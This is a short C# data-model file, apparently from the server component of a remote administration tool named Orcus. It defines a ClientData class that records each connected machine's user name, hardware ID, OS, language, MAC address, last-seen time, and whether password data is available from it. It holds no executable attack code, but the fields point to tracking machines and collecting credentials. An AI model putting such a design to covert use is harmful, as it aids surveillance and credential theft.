using System;
using Orcus.Shared.Connection;

namespace Orcus.Server.Core.Database
{
    public class ClientData
    {
        public string UserName { get; set; }
        public string HardwareId { get; set; }
        public string Group { get; set; }
        // ReSharper disable once InconsistentNaming
        public string OSName { get; set; }
        // ReSharper disable once InconsistentNaming
        public OSType OSType { get; set; }
        public int Id { get; set; }
        public string Language { get; set; }
        public DateTime LastSeen { get; set; }
        public bool IsComputerInformationAvailable { get; set; }
        public bool IsPasswordDataAvailable { get; set; }
        public byte[] MacAddress { get; set; }
    }
}